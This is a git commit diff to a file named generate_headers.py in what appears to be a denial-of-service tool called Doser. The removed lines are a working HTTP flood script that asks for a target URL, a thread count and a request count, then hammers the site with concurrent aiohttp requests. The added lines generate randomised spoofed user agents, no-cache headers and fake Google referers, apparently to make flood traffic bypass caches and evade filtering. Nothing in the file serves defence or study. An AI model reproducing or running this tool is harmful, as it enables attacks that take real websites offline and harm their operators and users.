a493d000a91564884d244c3a742165145fd529bd
Rax0 <65619773+Rax0Savage@users.noreply.github.com>
2020-06-03 12:33:48 +0300

    Update generate_headers.py

--- DH/Doser/generate_headers.py
+++ DH/Doser/generate_headers.py
@@ -1,86 +1,43 @@
+import random
 
-from generate_headers import initHeaders
-from get_proxy import get_proxy
+headers_useragents = list ()
 
-import asyncio
-import aiohttp
-import os
+def useragent_list():
+        global headers_useragents
 
-from datetime import datetime
-from threading import Thread
-from colorama import Fore
+        headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
+        headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
+        headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
+        headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
+        headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
+        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
+        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
+        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
+        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
+        headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
+        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
 
+def randomString(size: int) -> str:
+        out_str = ''
 
-def clear ():
-    if os.name == 'nt':
-        os.system ('cls')
-    else:
-        os.system ('clear')
+        for i in range(0, size):
+                a = random.randint(65 , 90)
+                out_str += chr(a)
 
+        return(out_str)
 
-def timestamp (function):
-    def wrapper (*args):
+def initHeaders():
 
-        start = datetime.now ()
-        function (*args)
-        end = datetime.now ()
+        useragent_list()
+        global headers_useragents
 
-        print ('У этого потока ушло ' + str (end - start))
+        headers = {
+                                'User-Agent': random.choice(headers_useragents),
+                                'Cache-Control': 'no-cache',
+                                'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
+                                'Referer': 'http://www.google.com/?q=' + randomString(random.randint(5, 10)),
+                                'Keep-Alive': str(random.randint(110, 120)),
+                                'Connection': 'keep-alive'
+                                }
 
-    return wrapper
-
-
-async def make_request (url: str):
-    async with aiohttp.ClientSession () as session:
-        try:
-            async with session.get (url, headers = initHeaders ()) as response:
-                await response.text ()
-                print (Fore.GREEN + 'Запрос на ' + url + ' Выполнен' + Fore.RESET)
-        except:
-            print (Fore.RED + 'Запрос на ' + url + ' Не Выполнен' + Fore.RESET)
-
-
-
-async def main (url: str, tasksCount: int):
-
-    tasks = []
-
-    for i in range (tasksCount):
-        task = asyncio.create_task (make_request (url))
-        tasks.append (task)
-
-    await asyncio.gather (*tasks)
-
-
-@timestamp
-def start (url: str,  tasksCount: int):
-    asyncio.run (main (url, tasksCount))
-
-
-if __name__ == '__main__':
-
-    clear ()
-
-    print ('''
-Разработка: @nkitas, @FSystem88
-Наш телеграмчик: @Termuxtop
-·▄▄▄▄        .▄▄ · ▄▄▄ .▄▄▄
-██▪ ██ ▪     ▐█ ▀. ▀▄.▀·▀▄ █·
-▐█· ▐█▌ ▄█▀▄ ▄▀▀▀█▄▐▀▀▪▄▐▀▀▄
-██. ██ ▐█▌.▐▌▐█▄▪▐█▐█▄▄▌▐█•█▌
-▀▀▀▀▀•  ▀█▄▀▪ ▀▀▀▀  ▀▀▀ .▀  ▀
-    ''')
-
-    #ask custom param
-    url = str (input ('Url сайта: '))
-    threadCount = int (input ('Кол-во потоков: '))
-    tasksCount = int (input ('Кол-во запросов для каждого потока: '))
-
-    #init threads
-    for i in range (threadCount):
-        t = Thread (target = start, name = f'thread{i}', args = (url, tasksCount))
-        t.start ()
-
-
-
-
+        return headers
